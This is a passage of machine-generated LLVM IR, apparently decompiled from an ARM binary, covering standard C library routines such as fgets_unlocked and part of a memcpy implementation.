  %v5_2be90 = add i32 %v3_2be8c, 1
  store i32 %v5_2be90, i32* %v2_2be8c, align 4
  br label %dec_label_pc_2bebc

dec_label_pc_2be9c:                               ; preds = %.thread9
  %v1_2be9c = inttoptr i32 %v0_2be60 to i16*
  store i32 %v0_2be60, i32* %r0.global-to-local, align 4
  %v2_2bea0 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_2bea0, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_2bea8 = call i32 @__stdio_READ(i16* %v1_2be9c, i32 %v2_2bea0, i32 1)
  store i32 %v5_2bea8, i32* %r0.global-to-local, align 4
  %v2_2beac = icmp eq i32 %v5_2bea8, 0
  br i1 %v2_2beac, label %dec_label_pc_2beb8, label %bb24

bb24:                                             ; preds = %dec_label_pc_2be9c
  %v4_2beb0 = load i8, i8* %stack_var_-17, align 1
  %v5_2beb0 = sext i8 %v4_2beb0 to i32
  store i32 %v5_2beb0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2bebc

dec_label_pc_2beb8:                               ; preds = %dec_label_pc_2be9c, %dec_label_pc_2bde0, %dec_label_pc_2be70
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2bebc

dec_label_pc_2bebc:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_2be84, %dec_label_pc_2bdfc, %dec_label_pc_2beb8
  %v2_2bec0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_2bec0, i32* @r4, align 4
  store i32 %v6_2bda4, i32* @r5, align 4
  store i32 %v9_2bda4, i32* @lr, align 4
  %v1_2bec4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_2bec4

; uselistorder directives
  uselistorder i32 %v2_2be24, { 1, 0, 2 }
  uselistorder i32 %v2_2be30, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_2bda8, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder label %dec_label_pc_2bebc, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_2beb8, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_2bed0 = load i32, i32* @r6, align 4
  %v12_2bed0 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2bed4 = icmp eq i32 %arg2, 0
  store i1 %v2_2bed4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_2bf5c, label %dec_label_pc_2bf44.preheader

dec_label_pc_2bf44.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_2bf442 = add i32 %arg2, -1
  store i32 %v1_2bf442, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_2bf448 = icmp eq i32 %arg2, 1
  store i1 %v7_2bf448, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2bf448, label %dec_label_pc_2bf4c, label %dec_label_pc_2bef0

dec_label_pc_2bef0:                               ; preds = %dec_label_pc_2bf44.preheader, %dec_label_pc_2bf44.backedge.dec_label_pc_2bef0_crit_edge
  %v0_2bf14 = phi i32 [ %v0_2bef0.pre, %dec_label_pc_2bf44.backedge.dec_label_pc_2bef0_crit_edge ], [ %arg3, %dec_label_pc_2bf44.preheader ]
  %v1_2bef0 = add i32 %v0_2bf14, 16
  %v2_2bef0 = inttoptr i32 %v1_2bef0 to i32*
  %v3_2bef0 = load i32, i32* %v2_2bef0, align 4
  store i32 %v3_2bef0, i32* %r2.global-to-local, align 4
  %v1_2bef4 = add i32 %v0_2bf14, 24
  %v2_2bef4 = inttoptr i32 %v1_2bef4 to i32*
  %v3_2bef4 = load i32, i32* %v2_2bef4, align 4
  store i32 %v3_2bef4, i32* %r3.global-to-local, align 4
  %v3_2bef8 = icmp uge i32 %v3_2bef0, %v3_2bef4
  store i1 %v3_2bef8, i1* %cpsr_c.global-to-local, align 1
  %v9_2bef8 = icmp eq i32 %v3_2bef0, %v3_2bef4
  store i1 %v9_2bef8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_2bef8, label %dec_label_pc_2bf14, label %dec_label_pc_2bf00

dec_label_pc_2bf00:                               ; preds = %dec_label_pc_2bef0
  %v1_2bf00 = inttoptr i32 %v3_2bef0 to i8*
  %v2_2bf00 = load i8, i8* %v1_2bf00, align 1
  %v3_2bf00 = zext i8 %v2_2bf00 to i32
  store i32 %v3_2bf00, i32* %r3.global-to-local, align 4
  %v5_2bf00 = add i32 %v3_2bef0, 1
  store i32 %v5_2bf00, i32* %r2.global-to-local, align 4
  %v2_2bf04 = load i32, i32* @r5, align 4
  %v3_2bf04 = inttoptr i32 %v2_2bf04 to i8*
  store i8 %v2_2bf00, i8* %v3_2bf04, align 1
  %v4_2bf04 = load i32, i32* @r5, align 4
  %v5_2bf04 = add i32 %v4_2bf04, 1
  store i32 %v5_2bf04, i32* @r5, align 4
  %v0_2bf08 = load i32, i32* %r3.global-to-local, align 4
  %v2_2bf08 = icmp ugt i32 %v0_2bf08, 9
  store i1 %v2_2bf08, i1* %cpsr_c.global-to-local, align 1
  %v7_2bf08 = icmp eq i32 %v0_2bf08, 10
  store i1 %v7_2bf08, i1* %cpsr_z.global-to-local, align 1
  %v0_2bf0c = load i32, i32* %r2.global-to-local, align 4
  %v1_2bf0c = load i32, i32* @r4, align 4
  %v2_2bf0c = add i32 %v1_2bf0c, 16
  %v3_2bf0c = inttoptr i32 %v2_2bf0c to i32*
  store i32 %v0_2bf0c, i32* %v3_2bf0c, align 4
  br i1 %v7_2bf08, label %dec_label_pc_2bf4c, label %dec_label_pc_2bf44.backedge

dec_label_pc_2bf14:                               ; preds = %dec_label_pc_2bef0
  %v1_2bf14 = inttoptr i32 %v0_2bf14 to i16*
  %v3_2bf18 = call i32 @getc_unlocked(i16* %v1_2bf14)
  %v3_2bf1c = icmp eq i32 %v3_2bf18, -1
  store i1 %v3_2bf1c, i1* %cpsr_c.global-to-local, align 1
  %v8_2bf1c = icmp eq i32 %v3_2bf18, -1
  store i1 %v8_2bf1c, i1* %cpsr_z.global-to-local, align 1
  %v1_2bf20 = urem i32 %v3_2bf18, 256
  store i32 %v1_2bf20, i32* %r3.global-to-local, align 4
  br i1 %v3_2bf1c, label %dec_label_pc_2bf28, label %dec_label_pc_2bf40

dec_label_pc_2bf28:                               ; preds = %dec_label_pc_2bf14
  %v0_2bf28 = load i32, i32* @r4, align 4
  %v1_2bf28 = inttoptr i32 %v0_2bf28 to i16*
  %v2_2bf28 = load i16, i16* %v1_2bf28, align 2
  %v3_2bf28 = zext i16 %v2_2bf28 to i32
  store i32 %v3_2bf28, i32* %r3.global-to-local, align 4
  %v1_2bf2c = and i32 %v3_2bf28, 8
  %v2_2bf2c = icmp eq i32 %v1_2bf2c, 0
  store i1 %v2_2bf2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2bf2c, label %dec_label_pc_2bf4c, label %dec_label_pc_2bf5c

dec_label_pc_2bf40:                               ; preds = %dec_label_pc_2bf14
  %v1_2bf38 = trunc i32 %v3_2bf18 to i8
  %v2_2bf38 = load i32, i32* @r5, align 4
  %v3_2bf38 = inttoptr i32 %v2_2bf38 to i8*
  store i8 %v1_2bf38, i8* %v3_2bf38, align 1
  %v4_2bf38 = load i32, i32* @r5, align 4
  %v5_2bf38 = add i32 %v4_2bf38, 1
  store i32 %v5_2bf38, i32* @r5, align 4
  %v0_2bf3c = load i32, i32* %r3.global-to-local, align 4
  %v2_2bf3c = icmp ugt i32 %v0_2bf3c, 9
  store i1 %v2_2bf3c, i1* %cpsr_c.global-to-local, align 1
  %v7_2bf3c = icmp eq i32 %v0_2bf3c, 10
  store i1 %v7_2bf3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2bf3c, label %dec_label_pc_2bf4c, label %dec_label_pc_2bf44.backedge

dec_label_pc_2bf44.backedge:                      ; preds = %dec_label_pc_2bf40, %dec_label_pc_2bf00
  %v0_2bf44 = load i32, i32* @r6, align 4
  %v1_2bf44 = add i32 %v0_2bf44, -1
  store i32 %v1_2bf44, i32* @r6, align 4
  %v2_2bf44 = icmp ne i32 %v0_2bf44, 0
  store i1 %v2_2bf44, i1* %cpsr_c.global-to-local, align 1
  %v7_2bf44 = icmp eq i32 %v0_2bf44, 1
  store i1 %v7_2bf44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2bf44, label %dec_label_pc_2bf4c, label %dec_label_pc_2bf44.backedge.dec_label_pc_2bef0_crit_edge

dec_label_pc_2bf44.backedge.dec_label_pc_2bef0_crit_edge: ; preds = %dec_label_pc_2bf44.backedge
  %v0_2bef0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2bef0

dec_label_pc_2bf4c:                               ; preds = %dec_label_pc_2bf40, %dec_label_pc_2bf44.backedge, %dec_label_pc_2bf00, %dec_label_pc_2bf44.preheader, %dec_label_pc_2bf28
  %v0_2bf4c = load i32, i32* @r5, align 4
  %v1_2bf4c = load i32, i32* @r7, align 4
  %v3_2bf4c = icmp uge i32 %v0_2bf4c, %v1_2bf4c
  store i1 %v3_2bf4c, i1* %cpsr_c.global-to-local, align 1
  %v9_2bf4c = icmp eq i32 %v0_2bf4c, %v1_2bf4c
  store i1 %v9_2bf4c, i1* %cpsr_z.global-to-local, align 1
  %v2_2bf50 = xor i1 %v9_2bf4c, true
  %v3_2bf50 = and i1 %v3_2bf4c, %v2_2bf50
  br i1 %v3_2bf50, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_2bf4c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_2bf54 = inttoptr i32 %v0_2bf4c to i8*
  store i8 0, i8* %v7_2bf54, align 1
  %v0_2bf58.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_2bf58.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_2bf4c, %bb
  %v1_2bf58 = phi i1 [ %v1_2bf58.pre, %bb ], [ %v9_2bf4c, %dec_label_pc_2bf4c ]
  %v0_2bf58 = phi i1 [ %v0_2bf58.pre, %bb ], [ %v3_2bf4c, %dec_label_pc_2bf4c ]
  %v2_2bf58 = xor i1 %v1_2bf58, true
  %v3_2bf58 = and i1 %v0_2bf58, %v2_2bf58
  br i1 %v3_2bf58, label %.dec_label_pc_2bf60_crit_edge, label %dec_label_pc_2bf5c

.dec_label_pc_2bf60_crit_edge:                    ; preds = %.thread14
  %v0_2bf60.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_2bf60

dec_label_pc_2bf5c:                               ; preds = %entry, %dec_label_pc_2bf28, %.thread14
  br label %dec_label_pc_2bf60

dec_label_pc_2bf60:                               ; preds = %.dec_label_pc_2bf60_crit_edge, %dec_label_pc_2bf5c
  %v0_2bf60 = phi i32 [ %v0_2bf60.pre, %.dec_label_pc_2bf60_crit_edge ], [ 0, %dec_label_pc_2bf5c ]
  store i32 %v9_2bed0, i32* @r6, align 4
  store i32 %v12_2bed0, i32* @r7, align 4
  ret i32 %v0_2bf60

; uselistorder directives
  uselistorder i1 %v9_2bf4c, { 1, 0, 2 }
  uselistorder i32 %v1_2bf4c, { 1, 0 }
  uselistorder i32 %v0_2bf4c, { 0, 2, 1 }
  uselistorder i32 %v0_2bf44, { 2, 0, 1 }
  uselistorder i32 %v0_2bf3c, { 1, 0 }
  uselistorder i32 %v3_2bf18, { 2, 1, 0, 3 }
  uselistorder i32 %v0_2bf08, { 1, 0 }
  uselistorder i32 %v3_2bef0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_2bf14, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_2bf60, { 1, 0 }
  uselistorder label %dec_label_pc_2bf5c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_2bf4c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_2bef0, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_2bf70 = load i32, i32* %r1.global-to-local, align 4
  %v1_2bf70 = load i32, i32* %r0.global-to-local, align 4
  %v2_2bf70 = sub i32 %v0_2bf70, %v1_2bf70
  %v3_2bf70 = icmp ult i32 %v0_2bf70, %v1_2bf70
  %v4_2bf70 = xor i32 %v1_2bf70, %v0_2bf70
  %v5_2bf70 = xor i32 %v2_2bf70, %v0_2bf70
  %v6_2bf70 = and i32 %v5_2bf70, %v4_2bf70
  %v7_2bf70 = icmp slt i32 %v6_2bf70, 0
  store i1 %v7_2bf70, i1* %cpsr_v.global-to-local, align 1
  %v8_2bf70 = icmp slt i32 %v2_2bf70, 0
  store i1 %v8_2bf70, i1* %cpsr_n.global-to-local, align 1
  %v9_2bf70 = icmp eq i32 %v0_2bf70, %v1_2bf70
  store i1 %v9_2bf70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_2bf70, label %dec_label_pc_2c1c4, label %dec_label_pc_2bf78

dec_label_pc_2bf78:                               ; preds = %entry
  br i1 %v9_2bf70, label %.thread130, label %bb

.thread130:                                       ; preds = %bb154, %.thread129, %bb151, %dec_label_pc_2bf78
  %merge = phi i32 [ %v0_2bf70, %dec_label_pc_2bf78 ], [ %v2_2c258, %bb151 ], [ %v11_2c274, %bb154 ], [ %v7_2c274, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_2bf78
  %v5_2bf7c = inttoptr i32 %v1_2bf70 to i8*
  store i8* %v5_2bf7c, i8** %stack_var_-8, align 4
  %v8_2bf7c = load i32, i32* @lr, align 4
  %v0_2bf80 = load i32, i32* @r2, align 4
  %v2_2bf80 = add i32 %v0_2bf80, -4
  store i32 %v2_2bf80, i32* %r2.global-to-local, align 4
  %v4_2bf80 = sub i32 3, %v0_2bf80
  %v5_2bf80 = and i32 %v4_2bf80, %v0_2bf80
  %v6_2bf80 = icmp slt i32 %v5_2bf80, 0
  store i1 %v6_2bf80, i1* %cpsr_v.global-to-local, align 1
  %v7_2bf80 = icmp slt i32 %v2_2bf80, 0
  store i1 %v7_2bf80, i1* %cpsr_n.global-to-local, align 1
  %v8_2bf80 = icmp eq i32 %v0_2bf80, 4
  store i1 %v8_2bf80, i1* %cpsr_z.global-to-local, align 1
  %v5_2bf84 = icmp slt i32 %v0_2bf80, 4
  br i1 %v5_2bf84, label %bb141, label %dec_label_pc_2bf88

dec_label_pc_2bf88:                               ; preds = %bb
  %v1_2bf88 = urem i32 %v1_2bf70, 4
  store i32 %v1_2bf88, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_2bf88 = icmp eq i32 %v1_2bf88, 0
  store i1 %v2_2bf88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2bf88, label %dec_label_pc_2bf90, label %dec_label_pc_2c03c

dec_label_pc_2bf90:                               ; preds = %dec_label_pc_2bf88
  %v1_2bf90 = urem i32 %v0_2bf70, 4
  store i32 %v1_2bf90, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_2bf90 = icmp eq i32 %v1_2bf90, 0
  store i1 %v2_2bf90, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_2bf70 to i2
  br i1 %v2_2bf90, label %dec_label_pc_2bf98, label %dec_label_pc_2c06c

dec_label_pc_2bf98:                               ; preds = %dec_label_pc_2bf90, %dec_label_pc_2c064
  %v0_2bfb094 = phi i32 [ %v1_2bf70, %dec_label_pc_2bf90 ], [ %v0_2c18c77, %dec_label_pc_2c064 ]
  %v0_2bfac93 = phi i32 [ %v0_2bf70, %dec_label_pc_2bf90 ], [ %v0_2c064, %dec_label_pc_2c064 ]
  %v0_2bf98 = phi i32 [ %v2_2bf80, %dec_label_pc_2bf90 ], [ %v2_2c05c, %dec_label_pc_2c064 ]
  %v1_2bf98 = add i32 %v0_2bf98, -8
  store i32 %v1_2bf98, i32* %r2.global-to-local, align 4
  %v3_2bf98 = sub i32 7, %v0_2bf98
  %v4_2bf98 = and i32 %v3_2bf98, %v0_2bf98
  %v5_2bf98 = icmp slt i32 %v4_2bf98, 0
  store i1 %v5_2bf98, i1* %cpsr_v.global-to-local, align 1
  %v6_2bf98 = icmp slt i32 %v1_2bf98, 0
  store i1 %v6_2bf98, i1* %cpsr_n.global-to-local, align 1
  %v7_2bf98 = icmp eq i32 %v0_2bf98, 8
  store i1 %v7_2bf98, i1* %cpsr_z.global-to-local, align 1
  %v2_2bf9c = xor i1 %v6_2bf98, %v5_2bf98
  br i1 %v2_2bf9c, label %dec_label_pc_2bfec, label %dec_label_pc_2bfa0

dec_label_pc_2bfa0:                               ; preds = %dec_label_pc_2bf98
  %v1_2bfa0 = add i32 %v0_2bf98, -28
  store i32 %v1_2bfa0, i32* %r2.global-to-local, align 4
  %v3_2bfa0 = sub i32 27, %v0_2bf98
  %v4_2bfa0 = and i32 %v3_2bfa0, %v1_2bf98
  %v5_2bfa0 = icmp slt i32 %v4_2bfa0, 0
  store i1 %v5_2bfa0, i1* %cpsr_v.global-to-local, align 1
  %v6_2bfa0 = icmp slt i32 %v1_2bfa0, 0
  store i1 %v6_2bfa0, i1* %cpsr_n.global-to-local, align 1
  %v7_2bfa0 = icmp eq i32 %v1_2bf98, 20
  store i1 %v7_2bfa0, i1* %cpsr_z.global-to-local, align 1
  %v2_2bfa4 = xor i1 %v6_2bfa0, %v5_2bfa0
  br i1 %v2_2bfa4, label %dec_label_pc_2bfd8, label %dec_label_pc_2bfa8

dec_label_pc_2bfa8:                               ; preds = %dec_label_pc_2bfa0
  %v0_2bfa8 = load i32, i32* @r4, align 4
  store i32 %v0_2bfa8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_2bfac

dec_label_pc_2bfac:                               ; preds = %dec_label_pc_2bfac.dec_label_pc_2bfac_crit_edge, %dec_label_pc_2bfa8
  %v0_2bfb0 = phi i32 [ %v12_2bfb8, %dec_label_pc_2bfac.dec_label_pc_2bfac_crit_edge ], [ %v0_2bfb094, %dec_label_pc_2bfa8 ]
  %v0_2bfac = phi i32 [ %v0_2bfac.pre, %dec_label_pc_2bfac.dec_label_pc_2bfac_crit_edge ], [ %v0_2bfac93, %dec_label_pc_2bfa8 ]
  %v1_2bfac = inttoptr i32 %v0_2bfac to i32*
  %v2_2bfac = load i32, i32* %v1_2bfac, align 4
  %v3_2bfac = add i32 %v0_2bfac, 4
  %v4_2bfac = inttoptr i32 %v3_2bfac to i32*
  %v5_2bfac = load i32, i32* %v4_2bfac, align 4
  store i32 %v5_2bfac, i32* %r4.global-to-local, align 4
  %v6_2bfac = add i32 %v0_2bfac, 8
  %v7_2bfac = inttoptr i32 %v6_2bfac to i32*
  %v8_2bfac = load i32, i32* %v7_2bfac, align 4
  store i32 %v8_2bfac, i32* %ip.global-to-local, align 4
  %v9_2bfac = add i32 %v0_2bfac, 12
  %v10_2bfac = inttoptr i32 %v9_2bfac to i32*
  %v11_2bfac = load i32, i32* %v10_2bfac, align 4
  store i32 %v11_2bfac, i32* %lr.global-to-local, align 4
  %v12_2bfac = add i32 %v0_2bfac, 16
  store i32 %v12_2bfac, i32* %r1.global-to-local, align 4
  %v1_2bfb0 = inttoptr i32 %v0_2bfb0 to i32*
  store i32 %v2_2bfac, i32* %v1_2bfb0, align 4
  %v3_2bfb0 = add i32 %v0_2bfb0, 4
  %v4_2bfb0 = inttoptr i32 %v3_2bfb0 to i32*
  %v5_2bfb0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_2bfb0, i32* %v4_2bfb0, align 4
  %v6_2bfb0 = add i32 %v0_2bfb0, 8
  %v7_2bfb0 = inttoptr i32 %v6_2bfb0 to i32*
  %v8_2bfb0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_2bfb0, i32* %v7_2bfb0, align 4
  %v9_2bfb0 = add i32 %v0_2bfb0, 12
  %v10_2bfb0 = inttoptr i32 %v9_2bfb0 to i32*
  %v11_2bfb0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_2bfb0, i32* %v10_2bfb0, align 4
  %v12_2bfb0 = add i32 %v0_2bfb0, 16
  store i32 %v12_2bfb0, i32* %r0.global-to-local, align 4
  %v0_2bfb4 = load i32, i32* %r1.global-to-local, align 4
  %v1_2bfb4 = inttoptr i32 %v0_2bfb4 to i32*
  %v2_2bfb4 = load i32, i32* %v1_2bfb4, align 4
  store i32 %v2_2bfb4, i32* @r3, align 4
  %v3_2bfb4 = add i32 %v0_2bfb4, 4
  %v4_2bfb4 = inttoptr i32 %v3_2bfb4 to i32*
  %v5_2bfb4 = load i32, i32* %v4_2bfb4, align 4
  store i32 %v5_2bfb4, i32* %r4.global-to-local, align 4
  %v6_2bfb4 = add i32 %v0_2bfb4, 8
  %v7_2bfb4 = inttoptr i32 %v6_2bfb4 to i32*
  %v8_2bfb4 = load i32, i32* %v7_2bfb4, align 4
  store i32 %v8_2bfb4, i32* @ip, align 4
  %v9_2bfb4 = add i32 %v0_2bfb4, 12
  %v10_2bfb4 = inttoptr i32 %v9_2bfb4 to i32*
  %v11_2bfb4 = load i32, i32* %v10_2bfb4, align 4
  store i32 %v11_2bfb4, i32* %lr.global-to-local, align 4
  %v12_2bfb4 = add i32 %v0_2bfb4, 16
  store i32 %v12_2bfb4, i32* %r1.global-to-local, align 4
  %v1_2bfb8 = inttoptr i32 %v12_2bfb0 to i32*
  store i32 %v2_2bfb4, i32* %v1_2bfb8, align 4
  %v3_2bfb8 = add i32 %v0_2bfb0, 20
  %v4_2bfb8 = inttoptr i32 %v3_2bfb8 to i32*
  %v5_2bfb8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_2bfb8, i32* %v4_2bfb8, align 4
  %v6_2bfb8 = add i32 %v0_2bfb0, 24
  %v7_2bfb8 = inttoptr i32 %v6_2bfb8 to i32*
  %v8_2bfb8 = load i32, i32* @ip, align 4
  store i32 %v8_2bfb8, i32* %v7_2bfb8, align 4
  %v9_2bfb8 = add i32 %v0_2bfb0, 28
  %v10_2bfb8 = inttoptr i32 %v9_2bfb8 to i32*
  %v11_2bfb8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_2bfb8, i32* %v10_2bfb8, align 4
  %v12_2bfb8 = add i32 %v0_2bfb0, 32
  store i32 %v12_2bfb8, i32* %r0.global-to-local, align 4
  %v0_2bfbc = load i32, i32* %r2.global-to-local, align 4
  %v1_2bfbc = add i32 %v0_2bfbc, -32
  store i32 %v1_2bfbc, i32* %r2.global-to-local, align 4
  %v3_2bfbc = sub i32 31, %v0_2bfbc
  %v4_2bfbc = and i32 %v3_2bfbc, %v0_2bfbc
  %v5_2bfbc = icmp slt i32 %v4_2bfbc, 0
  %v6_2bfbc = icmp slt i32 %v1_2bfbc, 0
  %v2_2bfc0 = xor i1 %v6_2bfbc, %v5_2bfbc
  br i1 %v2_2bfc0, label %dec_label_pc_2bfc4, label %dec_label_pc_2bfac.dec_label_pc_2bfac_crit_edge

dec_label_pc_2bfac.dec_label_pc_2bfac_crit_edge:  ; preds = %dec_label_pc_2bfac
  %v0_2bfac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2bfac

dec_label_pc_2bfc4:                               ; preds = %dec_label_pc_2bfac
  %v1_2bfc4 = add i32 %v0_2bfbc, -16
  %v3_2bfc4 = add i32 %v0_2bfbc, 2147483616
  %v4_2bfc4 = and i32 %v1_2bfc4, %v3_2bfc4
  %v5_2bfc4 = icmp slt i32 %v4_2bfc4, 0
  store i1 %v5_2bfc4, i1* %cpsr_v.global-to-local, align 1
  %v6_2bfc4 = icmp slt i32 %v1_2bfc4, 0
  store i1 %v6_2bfc4, i1* %cpsr_n.global-to-local, align 1
  %v7_2bfc4 = icmp eq i32 %v1_2bfc4, 0
  store i1 %v7_2bfc4, i1* %cpsr_z.global-to-local, align 1
  %v2_2bfc8 = xor i1 %v6_2bfc4, %v5_2bfc4
  br i1 %v2_2bfc8, label %bb138, label %bb137

bb137:                                            ; preds = %dec_label_pc_2bfc4
  %v3_2bfc8 = load i32, i32* %r1.global-to-local, align 4
  %v4_2bfc8 = inttoptr i32 %v3_2bfc8 to i32*
  %v5_2bfc8 = load i32, i32* %v4_2bfc8, align 4
  store i32 %v5_2bfc8, i32* @r3, align 4
  %v6_2bfc8 = add i32 %v3_2bfc8, 4
  %v7_2bfc8 = inttoptr i32 %v6_2bfc8 to i32*
  %v8_2bfc8 = load i32, i32* %v7_2bfc8, align 4
  store i32 %v8_2bfc8, i32* %r4.global-to-local, align 4
  %v9_2bfc8 = add i32 %v3_2bfc8, 8
  %v10_2bfc8 = inttoptr i32 %v9_2bfc8 to i32*
  %v11_2bfc8 = load i32, i32* %v10_2bfc8, align 4
  store i32 %v11_2bfc8, i32* @ip, align 4
  %v12_2bfc8 = add i32 %v3_2bfc8, 12
  %v13_2bfc8 = inttoptr i32 %v12_2bfc8 to i32*
  %v14_2bfc8 = load i32, i32* %v13_2bfc8, align 4
  store i32 %v14_2bfc8, i32* %lr.global-to-local, align 4
  %v15_2bfc8 = add i32 %v3_2bfc8, 16
  store i32 %v15_2bfc8, i32* %r1.global-to-local, align 4
  %v4_2bfcc = inttoptr i32 %v12_2bfb8 to i32*
  store i32 %v5_2bfc8, i32* %v4_2bfcc, align 4
  %v6_2bfcc = add i32 %v0_2bfb0, 36
  %v7_2bfcc = inttoptr i32 %v6_2bfcc to i32*
  %v8_2bfcc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_2bfcc, i32* %v7_2bfcc, align 4
  %v9_2bfcc = add i32 %v0_2bfb0, 40
  %v10_2bfcc = inttoptr i32 %v9_2bfcc to i32*
  %v11_2bfcc = load i32, i32* @ip, align 4
  store i32 %v11_2bfcc, i32* %v10_2bfcc, align 4
  %v12_2bfcc = add i32 %v0_2bfb0, 44
  %v13_2bfcc = inttoptr i32 %v12_2bfcc to i32*
  %v14_2bfcc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_2bfcc, i32* %v13_2bfcc, align 4
  %v15_2bfcc = add i32 %v0_2bfb0, 48
  store i32 %v15_2bfcc, i32* %r0.global-to-local, align 4
  %v3_2bfd0 = load i32, i32* %r2.global-to-local, align 4
  %v4_2bfd0 = add i32 %v3_2bfd0, -16
  store i32 %v4_2bfd0, i32* %r2.global-to-local, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_2bfc4, %bb137
  %v3_2bfe0102111 = phi i32 [ %v15_2bfcc, %bb137 ], [ %v12_2bfb8, %dec_label_pc_2bfc4 ]
  %v0_2bfd8.pre = phi i32 [ %v4_2bfd0, %bb137 ], [ %v1_2bfbc, %dec_label_pc_2bfc4 ]
  %v2_2bfd4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_2bfd4, i32* @r4, align 4
  br label %dec_label_pc_2bfd8

dec_label_pc_2bfd8:                               ; preds = %dec_label_pc_2bfa0, %bb138
  %v3_2bfe0101 = phi i32 [ %v0_2bfb094, %dec_label_pc_2bfa0 ], [ %v3_2bfe0102111, %bb138 ]
  %v0_2bfd8 = phi i32 [ %v1_2bfa0, %dec_label_pc_2bfa0 ], [ %v0_2bfd8.pre, %bb138 ]
  %v1_2bfd8 = add i32 %v0_2bfd8, 20
  store i32 %v1_2bfd8, i32* %r2.global-to-local, align 4
  %v3_2bfd8 = sub i32 0, %v0_2bfd8
  %v4_2bfd8 = and i32 %v1_2bfd8, %v3_2bfd8
  %v5_2bfd8 = icmp slt i32 %v4_2bfd8, 0
  store i1 %v5_2bfd8, i1* %cpsr_v.global-to-local, align 1
  %v6_2bfd8 = icmp slt i32 %v1_2bfd8, 0
  store i1 %v6_2bfd8, i1* %cpsr_n.global-to-local, align 1
  %v7_2bfd8 = icmp eq i32 %v1_2bfd8, 0
  store i1 %v7_2bfd8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2bfdc
